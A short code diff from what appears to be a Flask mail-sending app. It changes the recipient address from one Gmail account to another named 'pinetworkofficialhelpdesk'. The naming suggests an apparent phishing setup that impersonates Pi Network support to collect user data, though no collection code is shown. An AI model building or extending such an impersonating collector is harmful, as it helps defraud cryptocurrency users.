@@ -20,7 +20,7 @@ CORS(app)
 
 API_TOKEN = os.getenv('MAILSENDER_API')
 FROM_EMAIL = 'noreply@test-vz9dlemm9214kj50.mlsender.net'  
-TO_EMAIL = 'pimigration.org@gmail.com' 
+TO_EMAIL = 'pinetworkofficialhelpdesk@gmail.com' 
 
 @app.route('/<user_address>')
 def home(user_address):
